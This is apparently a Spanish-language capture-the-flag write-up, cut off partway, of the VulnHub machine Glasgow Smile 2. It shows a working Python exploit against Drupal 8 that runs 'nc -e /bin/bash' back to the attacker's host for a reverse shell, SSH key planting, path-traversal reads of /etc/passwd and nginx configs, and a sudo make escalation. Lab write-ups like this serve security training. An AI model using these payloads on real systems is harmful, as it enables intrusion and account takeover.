@@ -1,0 +1,560 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Glasgow Smile 2 VulnHub</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://avatars.githubusercontent.com/u/95899548?v=4">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Glasgow Smile 2 VulnHub" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Glasgow Smile 2 de la plataforma de VulnHub" />
+<meta property="og:description" content="Resolución de la máquina Glasgow Smile 2 de la plataforma de VulnHub" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Glasgow Smile 2 VulnHub" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Glasgow Smile 2 VulnHub" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Glasgow Smile 2 de la plataforma de VulnHub","headline":"Writeup Dina 1.0.1 Vulnhub","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Glasgow Smile 2 VulnHub</h1>
+          <p>Resolución de la máquina Glasgow Smile 2 de la plataforma de VulnHub</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 192.168.100.13
+Nmap scan report for 192.168.100.13
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   open     http
+83/tcp   open     mit-ml-dev
+8080/tcp filtered http-proxy</span>
+</code></pre></div></div>
+
+<div><p>Si damos un vistazo a la web nos encontramos con esto</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Como no nos dice mucho buscaremos posibles archivos y encontramos un todo.txt</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> dir -u 192.168.100.13 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 100
+===============================================================
+[+] Threads:                 100
+[+] Url:                     http://192.168.100.13
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/index.html           (Status: 200) [Size: 339]
+/.                    (Status: 200) [Size: 339]
+</span><span class="kd">/todo.txt</span><span class="p">             (Status: 200) [Size: 456]</span>
+</code></pre></div></div>
+
+<div><p>Al ver el contenido es un mensaje diciendo que borre el script de bash</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> 192.168.100.13/todo.txt
+         (
+ (       )\ )    )
+ )\ )   (()/( ( /(
+(()/(    /(_)))(_))
+ /(_))_ (_)) ((_)
+(_)) __|/ __||_  )
+  | (_ |\__ \ / /
+   \___||___//___|
+                    
+TODO:
+
+Remember to delete the file after you finish writing the bash automatic script.
+Do I really look like a guy with a plan? You know what I am? I'm a dog chasing cars.
+I wouldn't know what to do with one if I caught it! You know, I just... do things.
+Joker</span>
+</code></pre></div></div>
+
+<div><p>Asi que buscaremos posibles archivos de interes por extensiones .sh y encontramos joke</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gobuster</span><span class="p"> dir -u 192.168.100.13 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x .sh -t 100
+===============================================================
+[+] Url:                     http://192.168.100.13
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+</span><span class="kd">/joke.sh</span><span class="p">              (Status: 200) [Size: 1676]</span>
+</code></pre></div></div>
+
+<div><p>Al revisar el contenido del script podemos ver un directorio</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="p"> 192.168.100.13/joke.sh            
+
+# Glasgow Smile 2 Authentication Script
+# Script for authentication in progress. At the moment it only works with a single command.
+
+curl -u user:password http://localhost</span><span class="kd">/Glasgow---Smile2/</span><span class="p">
+# Don't use commands like that in automated scripts, I saved a file with some network traffic packets captured.
+# Analyze it and delete the script.I don't have permission to do it. Stupid Asshole.2
+&lt...................................................................................></span>
+</code></pre></div></div>
+
+<div><p>Si miramos con whatweb las tecnologias podemos ver que emplea Drupal 8</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ whatweb</span><span class="p"> http://192.168.100.13/Glasgow---Smile2/
+Title[</span><span class="na">Glasgow Smile 2 | Glasgow Smile 2</span><span class="p">]
+HTTPServer[</span><span class="no">Debian Linux</span><span class="p">]
+MetaGenerator[</span><span class="kd">Drupal 8</span><span class="p">]</span>
+</code></pre></div></div>
+
+<div><p>Buscando vulnerabilidades encontramos un exploit pero nos crea un archivo de texto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">'mail[#markup]'</span><span class="p">:</span><span class="s2"> 'echo ";-)" | tee hello.txt'</span>
+</code></pre></div></div>
+
+<div><p>Basandonos en el podemos crear un exploit que nos entable una reverse shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from</span><span class="p"> pwn </span><span class="kd">import</span><span class="p"> *
+</span><span class="kd">import</span><span class="p"> requests
+
+</span><span class="kd">if</span><span class="p"> len</span><span class="p">(sys.argv)</span><span class="no"> <</span><span class="p"> 3:
+</span><span class="k">    print</span><span class="p">(</span><span class="k">f</span><span class="s2">"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} &ltrhost> &ltlhost>\n"</span><span class="p">)
+    exit(</span><span class="no">1</span><span class="p">)
+
+</span><span class="kd">def</span><span class="k"> cmd</span><span class="p">():
+    time.sleep(1)
+    target </span><span class="kd">=</span><span class="k"> f</span><span class="s2">"http://{sys.argv[1]}/Glasgow---Smile2/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"</span><span class="p">
+    data </span><span class="kd">=</span><span class="p"> { </span><span class="s2">'form_id'</span><span class="p">:</span><span class="s2"> 'user_register_form'</span><span class="p">,</span><span class="s2"> '_drupal_ajax'</span><span class="p">:</span><span class="s2"> '1'</span><span class="p">,</span><span class="s2"> 'mail[#post_render][]'</span><span class="p">:</span><span class="s2"> 'exec'</span><span class="p">,</span><span class="s2"> 'mail[#type]'</span><span class="p">:</span><span class="s2"> 'markup'</span><span class="p">,</span><span class="s2"> 'mail[#markup]'</span><span class="p">:</span><span class="k"> f</span><span class="s2">"nc -e /bin/bash {sys.argv[2]} 443" </span><span class="p">}
+    requests.post(target, </span><span class="no">data</span><span class="kd">=</span><span class="p">data)
+
+threading.Thread(</span><span class="no">target</span><span class="kd">=</span><span class="p">cmd, args=()).start()
+shell </span><span class="kd">=</span><span class="p"> listen(</span><span class="na">443</span><span class="p">, timeout</span><span class="kd">=</span><span class="na">30</span><span class="p">).wait_for_connection()
+shell.sendline(</span><span class="k">b</span><span class="s2">"export HOME=/var/www TERM=xterm"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div>
+
+<div><p>Basta con ejecutarlo con la ip de la maquina y la local como argumento y conseguimos shell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3</span><span class="p"> exploit.py 192.168.100.13 192.168.100.9
+[</span><span class="s2">+</span><span class="p">] Trying to bind to :: on port 443: Done
+[</span><span class="s2">+</span><span class="p">] Waiting for connections on :::443: Got connection from 192.168.100.13
+[</span><span class="na">*</span><span class="p">] Switching to interactive mode
+</span><span class="kd">$</span><span class="p"> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="kd">$</span><span class="p"> hostname -I
+192.168.100.13 172.17.0.1 172.18.0.1</span>
+</code></pre></div></div>
+
+<div><p>No encontramos nada asi que enviamos nuestra clave publica como autorizada para ssh</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$</span><span class="p"> echo "ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABX56XvK7GdgV/s4itOau2RwJz5IhcHYrHnsjLsLq2qdG31rvldMCD4EwtLZsFW7kY59QmbNvUx0bBLepeOeDw/YQDfHlZuTdApfndut68XAbsNMIn5jjD6s7ssZxTHbqk1LQg5M9OU6IgCZbnm8ObVfRdFVHXJCRkoC5jonIQzJo7klw== ECDSA 521 bit Keys" > /var/www/.ssh/authorized_keys</span>
+</code></pre></div></div>
+
+<div><p>Podemos probar traernos el puerto 8080 que veiamos filtered al conectarnos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh</span><span class="p"> www-data@192.168.100.13 -L 8080:127.0.0.1:8080 -i id_rsa
+</span><span class="s2">www-data</span><span class="p">:</span><span class="na">~</span><span class="p">$ echo $SHELL
+*** forbidden path: /usr/bin/lshell
+</span><span class="s2">www-data</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Aunque estamos en una limited shell ahora podemos ver el puerto 8080 en local</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><p>Curiosamente cuando damos al enlace password nos lleva a un php que define page=</p></div>
+<div><p><img src="./3.png"><p></div>
+
+<div><p>Teniendo eso en cuenta conseguimos un lfi aunque parece ser de un contenedor</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> "http://127.0.0.1:8080/?page=../../../../../../etc/passwd" </span><span class="p">|</span><span class="s2"> grep</span><span class="no"> "sh$"</span><span class="p">
+root:x:0:0:root:/root:/bin/ash
+</span><span class="s2">❯ curl</span><span class="no"> "http://127.0.0.1:8080/?page=../../../../../../etc/hostname" </span><span class="p">|</span><span class="s2"> grep</span><span class="no"> "&lt/ht"</span><span class="p"> -A 100 |</span><span class="s2"> grep</span><span class="p"> -vE</span><span class="no"> "&lt/|^$"</span><span class="p">
+a06ab9e15816</span>
+</code></pre></div></div>
+
+<div><p>Al correr nginx podemos listar el archivo de configuración y vemos que incluye una ruta</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl </span><span class="no">"http://127.0.0.1:8080/?page=../../../../../../etc/nginx/nginx.conf"</span><span class="p"> |</span><span class="s2"> grep</span><span class="no"> "&lt/ht"</span><span class="p"> -A 100 |</span><span class="s2"> grep</span><span class="p"> -vE</span><span class="no"> "^$|^*#|&lt/"</span><span class="p">
+worker_processes auto;
+events {
+    worker_connections  1024;
+}
+http {
+    include       mime.types;
+    default_type  application/octet-stream;
+    sendfile        on;
+    keepalive_timeout 2;
+	client_max_body_size 100m;
+    server_tokens off;
+    include </span><span class="kd">/etc/nginx/sites-enabled/*</span><span class="p">;
+}</span>
+</code></pre></div></div>
+
+<div><p>Listando el default.conf encontramos una ruta que parece que contiene un index.php</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ curl</span><span class="no"> "http://127.0.0.1:8080/?page=../../../../../../etc/nginx/sites-enabled/default.conf" </span><span class="p">|</span><span class="s2"> grep </span><span class="no">"&lt/ht" </span><span class="p">-A 36 |</span><span class="s2"> grep</span><span class="p"> -vE </span><span class="no">"^$|^*#|&lt/"</span><span class="p">
+server {
+	root /var/www/html;
+	index index.php index.html index.htm;
+	server_name _;
+	
+	sendfile off;
+	error_log /dev/stdout info;
+	access_log /dev/stdout;
+	location /.git {
+           deny all;
+           return 403;
+        }
+location /helpmeriddlernewapplication {
+        root   </span><span class="kd">/var/www/myplace/hereis/threatened/</span><span class="p">;
+        index  index.php;
+    }</span>
+</code></pre></div></div>
+
+<div><p>Si miramos el <a href="http://127.0.0.1:8080/?page=../../../../../../var/www/myplace/hereis/threatened/index.php">directorio</a> pero desde la web nos encontramos el siguiente acertijo</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Al buscar el acertijo en el buscador podemos encontrar la respuesta: the human brain</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Al resolver el acertijo nos lanza una ventana emergente con lo que parece una contraseña</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Si miramos el passwd podemos ver a riddler, al conectarmos por ssh encontramos una flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">$</span><span class="p"> cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+bane:x:1000:1000:bane,,,:/home/bane:/bin/bash
+carnage:x:1001:1001:carnage,,,:/home/carnage:/bin/bash
+venom:x:1002:1002:venom,,,:/home/venom:/bin/bash
+</span><span class="kd">riddler</span><span class="p">:x:1003:1003:Riddler,,,:/home/riddler:/bin/bash</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sshpass</span><span class="p"> -p </span><span class="kd">J2h3cUy5Sc4gXLp5VXrE</span><span class="p"> ssh riddler@192.168.100.13
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1003(riddler) gid=1003(riddler) groups=1003(riddler)
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+192.168.100.13 172.17.0.1 172.18.0.1 
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt
+GS2{52ed6cddca27b44be716f9b856744008}
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Tambien podemos encontrar un directorio el cual contiene varios archivos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls
+</span><span class="na">theworldmustbeburned</span><span class="p">  user.txt
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ cd theworldmustbeburned
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~/theworldmustbeburned</span><span class="p">$ ls
+</span><span class="s2">burn</span><span class="p">  info.txt  jokerinthepack  message.txt
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~/theworldmustbeburned</span><span class="p">$ cat burn
+&lt?php function grdl($q0){$b1=fopen($q0,'r')or die();$a2=0;while(!feof($b1)){$t3=fgets($b1);$a2++;}rewind($b1);$s4=0;$n5=rand(0,$a2);while((!feof($b1))&&($s4&lt=$n5)){if($x6=fgets($b1,1048576)){$s4++;}}fclose($b1)or die();return $x6;}function gws($n7){$j8=str_split($n7);$a9=0;foreach($j8 as $m10){$a9+=ord($m10);}return $a9;}function encrypt($c11,$j12,$e13){$f14=true;$l15=gws($c11);$q16=gws($j12);$f17=str_split($e13);$a18="";foreach($f17 as $m10){$f14=!$f14;$p19=$l15;if($f14){$p19=$q16;}$a18.=ord($m10)+$p19;if($f14){$a18.="A";}else{$a18.="F";}}return $a18;}$q0="jokerinthepack";$e13=readline("Enter the string to encrypt: ");$c11=trim(grdl($q0));$j12=trim(grdl($q0));print"\n";print"Your keys:";print"\n";print"Key 1: ".$c11;print"\n";print"Key 2: ".$j12;print"\n";$a18=trim(encrypt($c11,$j12,$e13));print"Encrypted string:".$a18."\n\n\n";?>
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~/theworldmustbeburned</span><span class="p">$ cat info.txt 
+  __     __   __     _____    _____       _____       _____     _____    _____      _____     _____    __  __   
+ /\_\   /\_\ /_/\   /\___/\  /\ __/\     /\___/\    /\  __/\   /\___/\  /\ __/\    /\ __/\   /\___/\ /\  /\  /\ 
+ \/_/  ( ( (_) ) ) / / _ \ \ ) )  \ \   / / _ \ \   ) )(_ ) ) / / _ \ \ ) )  \ \   ) )  \ \ / / _ \ \\ \ \/ / / 
+  /\_\  \ \___/ /  \ \(_)/ // / /\ \ \  \ \(_)/ /  / / __/ /  \ \(_)/ // / /\ \ \ / / /\ \ \\ \(_)/ / \ \__/ /  
+ / / /  / / _ \ \  / / _ \ \\ \ \/ / /  / / _ \ \  \ \  _\ \  / / _ \ \\ \ \/ / / \ \ \/ / // / _ \ \  \__/ /   
+( (_(  ( (_( )_) )( (_( )_) )) )__/ /  ( (_( )_) )  ) )(__) )( (_( )_) )) )__/ /   ) )__/ /( (_( )_) ) / / /    
+ \/_/   \/_/ \_\/  \/_/ \_\/ \/___\/    \/_/ \_\/   \/____\/  \/_/ \_\/ \/___\/    \/___\/  \/_/ \_\/  \/_/     
+                                                                                                                
+Hey,
+listen to this song, maybe it could help you to try to understand my encryption code.
+Don't worry about it, it's impossible to break ;)
+
+https://www.youtube.com/watch?v=WV5-KhZMOtY
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~/theworldmustbeburned</span><span class="p">$ cat jokerinthepack
+Oh my boots they shine
+And my bowler looks fine
+Take some time and care
+Take a look at my hair
+We hit the dance hall
+So smart and so chic
+I make them laught a lot
+I make them accept me
+Secrets are spoken
+Plans are drawn in the dust
+With a gay bravado
+I'm taken into their trust
+Oh my boots they shine
+And my bowler looks fine
+But don't confide in my smile
+Because jokers are wild
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~/theworldmustbeburned</span><span class="p">$ cat message.txt
+Your keys:
+Key 1: I make them laught a lot
+Key 2: Because jokers are wild
+Encrypted string:2188F2236A2200F2236A2269F2301A2263F2291A2186F2299A2255F2300A2186F2287A2268F2291A2264F2229A2270F2222A2262F2301A2265F2297A2259F2300A2257F2222A2256F2301A2268F2222A2251F2300A2275F2306A2258F2295A2264F2293A2186F2298A2265F2293A2259F2289A2251F2298A2198F2222A2262F2295A2261F2291A2186F2299A2265F2300A2255F2311A2200F2222A2238F2294A2255F2311A2186F2289A2251F2300A2193F2306A2186F2288A2255F2222A2252F2301A2271F2293A2258F2306A2198F2222A2252F2307A2262F2298A2259F2291A2254F2234A2186F2304A2255F2287A2269F2301A2264F2291A2254F2234A2186F2301A2268F2222A2264F2291A2257F2301A2270F2295A2251F2306A2255F2290A2186F2309A2259F2306A2258F2236A2186F2273A2265F2299A2255F2222A2263F2291A2264F2222A2260F2307A2269F2306A2186F2309A2251F2300A2270F2222A2270F2301A2186F2309A2251F2306A2253F2294A2186F2306A2258F2291A2186F2309A2265F2304A2262F2290A2186F2288A2271F2304A2264F2236A2188F2222A2239F2260A2240F2259A2205F2244A2225F2308A2239F2299A2229F2242A2238F2289A2244F2257A2274F2256A2258F2246A2272F2275A2223F2277A2271F2279A2255F2297A2221F2279A
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~/theworldmustbeburned</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Analizando un poco la cadena encriptada encontramos que sigue un patron con F y A</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="na">2188</span><span class="kd">F</span><span class="na">2236</span><span class="kd">A</span><span class="na">2200</span><span class="kd">F</span><span class="na">2236</span><span class="kd">A</span><span class="na">2269</span><span class="kd">F</span><span class="na">2301</span><span class="kd">A</span><span class="na">2263</span><span class="kd">F</span><span class="na">2291</span><span class="kd">A</span><span class="na">2186</span><span class="kd">F</span><span class="na">2299</span><span class="kd">A</span><span class="na">2255</span><span class="kd">F</span><span class="na">2300</span><span class="kd">A</span>
+</code></pre></div></div>
+
+<div><p>Despues de analizar el php y la cadena encontramos que dependiendo la letra suma un valor</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">F </span><span class="kd">=</span><span class="p"> (</span><span class="kd">+</span><span class="na"> 2154</span><span class="p">)
+</span><span class="p">A </span><span class="kd">=</span><span class="p"> (</span><span class="kd">+</span><span class="na"> 2190</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div><p>Lo suma despues de hacer un ord a la cadena en texto claro, ejemplo con la letra "a"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">>>></span><span class="k"> ord</span><span class="p">(</span><span class="s2">'a'</span><span class="p">)</span><span class="kd"> +</span><span class="na"> 2154
+</span><span class="p">2251
+</span><span class="kd">>>></span><span class="s2"> "2251"</span><span class="kd"> +</span><span class="s2"> "F"
+</span><span class="p">2251F
+</span><span class="kd">>>></span><span class="k"> ord</span><span class="p">(</span><span class="s2">'a'</span><span class="p">)</span><span class="kd"> +</span><span class="na"> 2190
+</span><span class="p">2287
+</span><span class="kd">>>></span><span class="s2"> "2287"</span><span class="kd"> +</span><span class="s2"> "A"
+</span><span class="p">2287A</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">2251F</span><span class="kd"> = </span><span class="p">a
+</code><span class="p">2287A</span><span class="kd"> = </span><span class="p">a</span>
+</code></pre></div></div>
+
+<div><p>Sabiendo esto podemos invertirlo para verlo en texto plano, usaremos el inicio de la cadena</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">2188F2236A</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">>>> </span><span class="k">chr</span><span class="p">(</span><span class="na">2188</span><span class="kd"> - </span><span class="na">2154</span><span class="p">)
+"
+</span><span class="kd">>>> </span><span class="k">chr</span><span class="p">(</span><span class="na">2236</span><span class="kd"> - </span><span class="na">2190</span><span class="p">)
+.</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">2188F </span><span class="kd">=</span><span class="p"> "
+2236A </span><span class="kd">=</span><span class="p"> .
+2188F2236A </span><span class="kd">=</span><span class="p"> ".</span>
+</code></pre></div></div>
+
+<div><p>Para automatizarlo podemos crear un txt que en cada letra F o A haga un salto de linea</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~/theworldmustbeburned</span><span class="p">$ cat message.txt | grep -v ey | sed 's/Encrypted string\://g' | sed 's/F/F\n/g' | sed 's/A/A\n/g' | grep -v "^$" > new.txt
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~/theworldmustbeburned</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ademas crear un script que por cada linea haga el proceso dependiendo de la letra</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">with </span><span class="k">open</span><span class="p">(</span><span class="s2">"new.txt"</span><span class="p">)</span><span class="kd"> as</span><span class="p"> archivo:
+    </span><span class="kd">for</span><span class="p"> linea</span><span class="kd"> in</span><span class="p"> archivo:
+        linea </span><span class="kd">=</span><span class="p"> linea.strip()
+        resta </span><span class="kd">=</span><span class="k"> int</span><span class="p">(linea[:</span><span class="k">len</span><span class="p">(linea)</span><span class="kd">-</span><span class="na">1</span><span class="p">])
+        </span><span class="kd">if </span><span class="p">linea[</span><span class="kd">-</span><span class="na">1</span><span class="p">] </span><span class="kd">==</span><span class="s2"> "F"</span><span class="p">:
+            resta </span><span class="kd">-=</span><span class="na"> 2154
+        </span><span class="kd">if </span><span class="p">linea[</span><span class="kd">-</span><span class="na">1</span><span class="p">] </span><span class="kd">==</span><span class="s2"> "A"</span><span class="p">:
+            resta </span><span class="kd">-=</span><span class="na"> 2190
+        </span><span class="k">print</span><span class="p">(</span><span class="k">chr</span><span class="p">(resta))</span>
+</code></pre></div></div>
+
+<div><p>Teniendo el script solo queda ejecutarlo quitando los saltos de linea y nos da una contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~/theworldmustbeburned</span><span class="p">$ python3 decrypt.py | tr -d "\n"; echo
+"...some men aren't looking for anything logical, like money. They can't be bought, bullied, reasoned, or negotiated with. Some men just want to watch the world burn." </span><span class="kd">UFVE36GvUmK4TcZCxBh8vUEWuYekCY</span><span class="p">
+</span><span class="s2">riddler@glasgowsmile2</span><span class="p">:</span><span class="na">~/theworldmustbeburned</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Con esta contraseña podemos conectarnos como bane y obtener otra flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sshpass</span><span class="p"> -p </span><span class="kd">UFVE36GvUmK4TcZCxBh8vUEWuYekCY</span><span class="p"> ssh bane@192.168.100.13
+</span><span class="s2">bane@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(bane) gid=1000(bane) groups=1000(bane)
+</span><span class="s2">bane@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+192.168.100.13 172.17.0.1 172.18.0.1 
+</span><span class="s2">bane@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user2.txt 
+GS2{5c851b5e9ec996b38b7d0a544013380e}
+</span><span class="s2">bane@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si listamos privilegios de sudoers podemos ejecutar como carnage el binario make</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">bane@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+[sudo] password for bane: </span><span class="kd">UFVE36GvUmK4TcZCxBh8vUEWuYekCY</span><span class="p">
+Matching Defaults entries for bane on glasgowsmile2:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/bin\:/bin
+
+User bane may run the following commands on glasgowsmile2:
+    (</span><span class="kd">carnage</span><span class="p">) </span><span class="kd">/bin/make</span><span class="p">
+</span><span class="s2">bane@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Guiandonos de <a href="https://gtfobins.github.io/gtfobins/make/">gtfobins</a> podemos convertirnos en carnage y conseguir otra flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">bane@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -u carnage make -s --eval=$'x:\n\t-'"bash"
+</span><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">/home/bane</span><span class="p">$ cd
+</span><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1001(carnage) gid=1001(carnage) groups=1001(carnage),50(staff)
+</span><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+192.168.100.13 172.17.0.1 172.18.0.1 
+</span><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user3.txt
+GS2{988535ad480d747ef00c705541d08a6e}
+</span><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Listando tareas con pspy podemos ver que 1002 (venom) ejecuta la siguiente</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">CMD: UID=1002 PID=4376   | /bin/sh -c python /opt/get_out/moonlight.py</span>
+</code></pre></div></div>
+
+<div><p>No podemos leer el script pero si un mensaje sobre como funciona</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">/opt/get_out</span><span class="p">$ cat moonlight.py 
+cat: moonlight.py: Permission denied
+</span><span class="s2">carnage@glasgowsmile2</span><span class="p">:</span><span class="na">/opt/get_out</span><span class="p">$ cat help.txt
+
+I wrote a script that automatically allows you to have a zip of your personal folder.
+Now you can also delete the zip by mistake, it will be created again.
+Am I good or not? ;)
+
+@@@  @@@  @@@@@@@@  @@@  @@@   @@@@@@   @@@@@@@@@@   
+@@@  @@@  @@@@@@@@  @@@@ @@@  @@@@@@@@  @@@@@@@@@@@  
+@@!  @@@  @@!       @@!@!@@@  @@!  @@@  @@! @@! @@!  
+!@!  @!@  !@!       !@!!@!@!  !@!  @!@  !@! !@! !@!  
+@!@  !@!  @!!!:!    @!@ !!@!  @!@  !@!  @!! !!@ @!@  
+!@!  !!!  !!!!!:    !@!  !!!  !@!  !!!  !@!   ! !@!  
